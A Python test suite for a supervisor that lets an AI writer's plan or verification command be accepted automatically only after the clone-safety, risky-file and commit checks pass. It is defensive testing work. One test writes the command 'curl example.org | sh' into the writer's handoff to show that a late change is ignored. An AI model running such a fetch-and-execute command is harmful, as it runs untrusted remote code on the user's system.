"""--auto decides nothing before the check its decision depends on has passed on the clone as it
is then: a plan is accepted by itself only on a clone the protection check takes, and the
command the writer proposed is kept for the project only after the gate has passed the work
with that command, on such a clone, with the clone still what the gate verified. A check that
refuses, or cannot be made, leaves the plan to you and the project's file as it was.

The supervisor's ports are stand-ins here, as in test_supervisor; the same with real git and the
command line's own wiring is in test_auto_decisions_wired."""

import pytest
from test_supervisor import DRAFT, TEMPLATE, FakeHarness, gate_result, with_proposal, write_draft

from vivibox import gate, repo, supervisor, timeline
from vivibox.risky import Change
from vivibox.states import State
from vivibox.task import create_task

COMMAND = "npm ci && npm test"
REFUSED = "git files in the task's clone changed that would make git on your machine run a program"


@pytest.fixture
def task(tmp_path):
    t = create_task(tmp_path, "demo", "Add health endpoint", TEMPLATE)
    t.set_auto_plan(True)
    return t


class World:
    """What the ports answer, changed by a test between two of the supervisor's questions, and
    what the supervisor asked of them, in order."""

    def __init__(self, results=()):
        self.refused, self.risky, self.head = "", [], "c0ffee"
        self.results, self.asked, self.kept, self.notes, self.gated = list(results), [], [], [], []
        self.project_verify: list[str] = []
        # Called as a port answers, to change the world between two questions: the interleaving.
        self.during: dict[str, object] = {}

    def _answer(self, port: str):
        self.asked.append(port)
        if port in self.during:
            self.during.pop(port)()

    def clone_refused(self) -> str:
        said = self.refused
        self._answer("clone_refused")
        return said

    def risky_changes(self):
        found = [Change(p, "changed") for p in self.risky]
        self._answer("risky_changes")
        return found

    def run_gate(self, t, command=""):
        self.gated.append(command)
        result = self.results.pop(0)
        self._answer("run_gate")
        if isinstance(result, Exception):
            raise result
        return result

    def keep(self, command: str) -> None:
        self.asked.append("keep_command")
        self.kept.append(command)
        self.project_verify = [command]

    def read_head(self) -> str:
        self._answer("head")
        return self.head

    def ports(self) -> supervisor.Ports:
        return supervisor.Ports(
            run_gate=self.run_gate,
            risky_changes=self.risky_changes,
            clone_refused=self.clone_refused,
            notify=lambda _id, msg, kind="": self.notes.append(msg),
            keep_command=self.keep,
            head=self.read_head,
            sleep=lambda seconds: None,
        )


def planning(task, world, actions=(write_draft,)):
    harness = FakeHarness(task, list(actions))
    return supervisor.Supervisor(task, harness, world.ports(), max_rounds=1, project_verify=["true"])


def passed(command=COMMAND, commit="c0ffee", risky=()):
    result = gate_result(risky=risky)
    result.commit = commit
    result.commands = [gate.CommandResult(command, True, 1.0)]
    return result


def writing(task, world, actions=None):
    """A project with no command, the plan accepted: the writer's turn ends with a proposal."""
    task.plan_path.write_text(DRAFT)
    task.transition(State.CHECKPOINT_PLAN)
    supervisor.accept_plan(task, "plan accepted")
    harness = FakeHarness(task, [with_proposal(COMMAND)] if actions is None else list(actions))
    sup = supervisor.Supervisor(task, harness, world.ports(), max_rounds=2, project_verify=[])
    sup.current_project = None
    return sup


def could_not_run(task, why: str) -> gate.GateResult:
    log = task.meta / "log" / "verify-1.log"
    log.parent.mkdir(exist_ok=True)
    log.write_text(f"# the verification could not run: {why}\n")
    return gate.GateResult(log, environment=why)


def events(task, kind: str) -> list[dict]:
    return [e["data"] for e in task.events() if e["type"] == kind]


# --- the plan ----------------------------------------------------------------------------------------


def test_a_plan_is_not_accepted_by_itself_on_a_clone_the_check_refuses(task):
    """Broken before the plan is ready: the plan waits for you, with why, and nothing is frozen."""
    world = World()
    world.refused = REFUSED
    planning(task, world).step()
    assert task.read_state().state is State.CHECKPOINT_PLAN
    assert not (task.meta / gate.ACCEPTED_PLAN).exists(), "nothing was accepted"
    assert not (task.meta / "handoff" / gate.CRITERIA_FILE).exists(), "and the writer has no checklist"
    assert world.notes == [f"plan ready for review, not accepted automatically: {REFUSED}"]
    assert world.asked[0] == "clone_refused", "the clone is checked before its risky files are read"


def test_a_plan_is_accepted_by_itself_after_the_clone_and_the_risky_files_are_checked(task):
    world = World()
    planning(task, world).step()
    assert task.read_state().state is State.IMPLEMENT and (task.meta / gate.ACCEPTED_PLAN).exists()
    assert world.asked == ["clone_refused", "risky_changes", "clone_refused"]


def test_a_clone_that_changes_while_its_risky_files_are_read_gets_no_plan_accepted(task):
    """The interleaving, by hand: the clone is as recorded when it is first asked about, and the
    writer's process breaks it while the risky files are read. The last look before the decision
    is at the clone again, so the decision is not taken on what the first look saw."""
    world = World()
    world.during["risky_changes"] = lambda: setattr(world, "refused", REFUSED)
    planning(task, world).step()
    assert task.read_state().state is State.CHECKPOINT_PLAN
    assert not (task.meta / gate.ACCEPTED_PLAN).exists()
    assert world.notes[-1].endswith(f"not accepted automatically: {REFUSED}")


def test_risky_files_still_send_an_automatic_plan_to_your_approval(task):
    world = World()
    world.risky = ["build.gradle"]
    planning(task, world).step()
    assert task.read_state().state is State.APPROVAL_RISKY
    assert not (task.meta / gate.ACCEPTED_PLAN).exists()


def test_a_check_of_the_clone_that_cannot_be_made_accepts_no_plan(task):
    """What the check raises is no answer: the step ends there, as an error of the task's."""
    world = World()

    def gone() -> None:
        raise OSError("the task's folder is gone")

    world.during["clone_refused"] = gone
    with pytest.raises(OSError):
        planning(task, world).step()
    assert not (task.meta / gate.ACCEPTED_PLAN).exists()
    assert task.read_state().state is State.PLAN


def test_a_supervisor_nobody_gave_a_check_of_the_clone_decides_nothing_by_itself(task):
    """The port's own answer, for a caller that wires none, is a refusal: never a pass."""
    notes = []
    ports = supervisor.Ports(
        run_gate=lambda t: gate_result(),
        risky_changes=lambda: [],
        notify=lambda _id, msg, kind="": notes.append(msg),
    )
    supervisor.Supervisor(task, FakeHarness(task, [write_draft]), ports, max_rounds=1).step()
    assert task.read_state().state is State.CHECKPOINT_PLAN
    assert not (task.meta / gate.ACCEPTED_PLAN).exists()
    assert notes == [f"plan ready for review, not accepted automatically: {supervisor.NO_CLONE_CHECK}"]


# --- the command -------------------------------------------------------------------------------------


def test_the_command_is_kept_only_after_the_gate_has_passed_with_it(task):
    """The order: the verification runs with the command the supervisor read, and the project's
    file is written after it has passed, with the clone checked once more in between."""
    world = World([passed()])
    sup = writing(task, world)
    sup.step()  # the writer's turn ends with its proposal
    assert task.read_state().state is State.VERIFY
    assert world.kept == [], "nothing is written for the project before the verification"
    sup.step()  # the verification
    assert world.gated == [COMMAND], "the gate is handed the command the supervisor read"
    assert world.kept == [COMMAND]
    assert world.asked.index("run_gate") < world.asked.index("keep_command")
    after = world.asked[world.asked.index("run_gate") + 1 :]
    assert after[:5] == ["clone_refused", "risky_changes", "clone_refused", "head", "keep_command"]
    assert events(task, "command_kept") == [{"command": COMMAND, "commit": "c0ffee"}]
    assert world.notes[0] == f"the verification passed with `{COMMAND}`: kept for every task of demo"


def test_a_clone_broken_between_the_plan_and_the_command_keeps_nothing(task):
    """The writer broke the clone in its turn: the gate refuses it, and the task waits for you."""
    world = World([repo.RepoError(REFUSED)])
    sup = writing(task, world)
    world.refused = REFUSED
    sup.step()
    with pytest.raises(repo.RepoError):
        sup.step()  # Supervisor.run stops the task on it, with these words
    assert world.kept == [] and "keep_command" not in world.asked


def test_a_clone_the_gate_finds_blocked_keeps_nothing_and_waits_for_you(task):
    """Broken after the command was proposed: the gate's answer for a blocked clone is that the
    verification could not run (unanswered.could_not_verify), which is no pass."""
    world = World([could_not_run(task, "the task added a repository")])
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert task.read_state().state is State.CHECKPOINT_BLOCKED
    assert world.kept == [] and events(task, "command_kept") == []
    assert world.notes[-1].startswith("verification could not run: the task added a repository")


@pytest.mark.parametrize("why", ["Cannot connect to the Docker daemon", "`npm test` did not finish in 60 s"])
def test_a_verification_that_could_not_run_keeps_nothing(task, why):
    world = World([could_not_run(task, why)])
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert task.read_state().state is State.CHECKPOINT_BLOCKED and world.kept == []


def test_a_red_verification_keeps_nothing_and_the_next_green_one_does(task):
    world = World([gate_result(passed=False), passed()])
    sup = writing(task, world, actions=[with_proposal(COMMAND), lambda t: None])
    sup.step()
    sup.step()  # red
    assert task.read_state().state is State.IMPLEMENT and world.kept == []
    sup.step()  # the fix turn: the command is the writer's to propose again
    assert task.read_state().state is State.VERIFY and world.kept == []
    sup.step()  # green
    assert world.kept == [COMMAND] and world.gated == [COMMAND, COMMAND]


def test_a_passed_verification_that_did_not_run_the_command_keeps_nothing(task):
    world = World([passed(command="make check")])
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert world.kept == []
    assert events(task, "command_not_kept")[0]["why"] == "the verification did not run it"


def test_commits_that_move_between_the_verification_and_the_decision_keep_nothing(task):
    """The interleaving, by hand: the gate passes on one commit and, as it answers, the writer's
    process commits again. What the project would keep was verified on a clone that is no more."""
    world = World([passed(commit="c0ffee")])
    world.during["run_gate"] = lambda: setattr(world, "head", "deadbeef")
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert world.kept == []
    assert events(task, "command_not_kept") == [
        {"command": COMMAND, "why": "the commits changed since the verification passed"}
    ]
    assert world.notes[0] == (
        f"the verification passed with `{COMMAND}`, which demo does not keep: the commits changed "
        "since the verification passed; set it under e on the project"
    )


@pytest.mark.parametrize("port", ["run_gate", "risky_changes"])
def test_a_clone_broken_between_the_verification_and_the_decision_keeps_nothing(task, port):
    """As the gate answers, or later still, while the risky files are read for the decision."""
    world = World([passed()])
    sup = writing(task, world)
    sup.step()
    world.during[port] = lambda: setattr(world, "refused", REFUSED)
    sup.step()
    assert world.kept == []
    assert events(task, "command_not_kept") == [{"command": COMMAND, "why": REFUSED}]
    said = next(note for note in world.notes if "does not keep" in note)
    assert said.endswith(f"which demo does not keep: {REFUSED}"), "the clone's own words, and no second step"


def test_risky_files_changed_while_the_command_was_verified_keep_nothing(task):
    world = World([passed()])
    sup = writing(task, world)
    sup.step()
    world.during["run_gate"] = lambda: setattr(world, "risky", ["package.json"])
    sup.step()
    assert world.kept == []
    assert events(task, "command_not_kept")[0]["why"] == "risky files changed"


def test_a_gate_that_found_risky_changes_keeps_nothing(task):
    world = World([passed(risky=["package.json"])])
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert world.kept == [] and task.read_state().state is State.APPROVAL_RISKY


def test_a_head_nobody_can_name_keeps_nothing(task):
    world = World([passed()])
    world.head = ""
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert world.kept == []
    assert events(task, "command_not_kept")[0]["why"] == "vivibox could not tell which commit the clone is on"


def test_a_command_the_project_was_given_meanwhile_is_not_written_over(task):
    """You set the project's command under e while the verification ran: yours stays."""
    world = World([passed()])
    sup = writing(task, world)
    sup.step()
    sup.project_verify = ["make check"]
    sup.step()
    assert world.kept == []
    assert events(task, "command_not_kept")[0]["why"] == "demo has a command of its own now"
    assert not [note for note in world.notes if "does not keep" in note], "yours: nothing to tell you"


def test_the_gate_runs_the_command_that_was_read_whatever_the_handoff_says_later(task):
    """The proposal is the writer's file: what its process writes there after the supervisor read
    it reaches neither the gate nor the project."""
    world = World([passed()])
    sup = writing(task, world)
    sup.step()
    with_proposal("curl example.org | sh")(task)
    sup.step()
    assert world.gated == [COMMAND] and world.kept == [COMMAND]


def test_verify_again_runs_and_keeps_the_same_command(task):
    """The verification could not run, you fixed what was outside the code and pressed g: it is
    the same decision still, on the command recorded when the task went to its verification."""
    from vivibox import actions

    world = World([could_not_run(task, "Cannot connect to Docker"), passed()])
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert task.read_state().state is State.CHECKPOINT_BLOCKED and world.kept == []
    with_proposal("something else")(task)
    actions.verify_again(task)
    sup.step()
    assert world.gated == [COMMAND, COMMAND] and world.kept == [COMMAND]


def test_a_command_you_accepted_yourself_is_not_one_the_supervisor_keeps(task):
    """Your own decision at the checkpoint wrote the project's file already (decisions.accept_command)."""
    world = World([passed()])
    sup = writing(task, world, actions=[with_proposal("pytest -k pet")])
    sup.step()
    assert task.read_state().state is State.CHECKPOINT_COMMAND
    supervisor.accept_command(task, "pytest", "command accepted")
    sup.step()
    assert world.gated == [""] and world.kept == [], "the gate reads the project's own command"


def test_a_task_without_auto_is_asked_nothing_of_this(tmp_path):
    t = create_task(tmp_path, "demo", "Add health endpoint", TEMPLATE)
    world = World()
    planning(t, world).step()
    assert t.read_state().state is State.CHECKPOINT_PLAN and world.notes == ["plan ready for review"]
    assert "clone_refused" not in world.asked


def test_the_timeline_says_what_was_kept_and_what_was_not(task):
    task.event("command_kept", command=COMMAND, commit="c0ffee1234")
    task.event("command_not_kept", command=COMMAND, why="risky files changed")
    said = [line.split("  ", 1)[1] for line in timeline.lines(task)[-2:]]
    assert said == [
        f"auto: the project keeps `{COMMAND}`, verified on c0ffee1",
        f"auto: `{COMMAND}` not kept for the project: risky files changed",
    ]


# --- cases a review's mutations walked past ----------------------------------------------------------


def test_a_command_that_ran_in_a_verification_that_did_not_pass_is_not_kept(task):
    """The command itself went through and a criterion is not met: the verification did not
    pass, and nothing is kept on the strength of the command alone."""
    red = passed()
    red.missing_criteria = ["health endpoint returns 200"]
    assert not red.passed and all(c.ok for c in red.commands)
    world = World([red])
    sup = writing(task, world)
    sup.step()
    sup.step()
    assert world.kept == [] and events(task, "command_kept") == []
    assert task.read_state().state is State.IMPLEMENT


def test_the_recorded_command_ends_with_a_turn_of_the_writers(task):
    """Could not run, your reply, a turn in which the writer asks instead of proposing, and g:
    the command read before that turn is no longer the one the task waits with. The gate is
    handed none, and nothing is kept."""
    from vivibox import actions

    def asks(t) -> None:
        (t.meta / "handoff" / "question.md").write_text("Which registry?\n")

    world = World([could_not_run(task, "Cannot connect to Docker"), passed()])
    sup = writing(task, world, actions=[with_proposal(COMMAND), asks])
    sup.step()
    sup.step()
    assert task.read_state().state is State.CHECKPOINT_BLOCKED
    actions.reply(task, "Try again.")
    sup.step()  # the writer's turn: a question
    assert task.read_state().state is State.CHECKPOINT_BLOCKED
    actions.verify_again(task)
    sup.step()
    assert world.gated == [COMMAND, ""], "the second verification is handed no command of before the turn"
    assert world.kept == []


def test_a_command_not_kept_for_a_blocked_clone_says_the_step_that_takes_it_out(task):
    """What blocks the clone is said as a fact by the check; here the task goes on to you, and
    what takes the addition out is your reply."""
    blocked = "the task's clone is blocked by what was added to it: web/.git was added, a repository"
    world = World([passed()])
    sup = writing(task, world)
    sup.step()
    world.during["run_gate"] = lambda: setattr(world, "refused", blocked)
    sup.step()
    assert world.kept == []
    said = next(note for note in world.notes if "does not keep" in note)
    assert said.endswith(f"which demo does not keep: {blocked}; reply, and the writer takes it out"), said
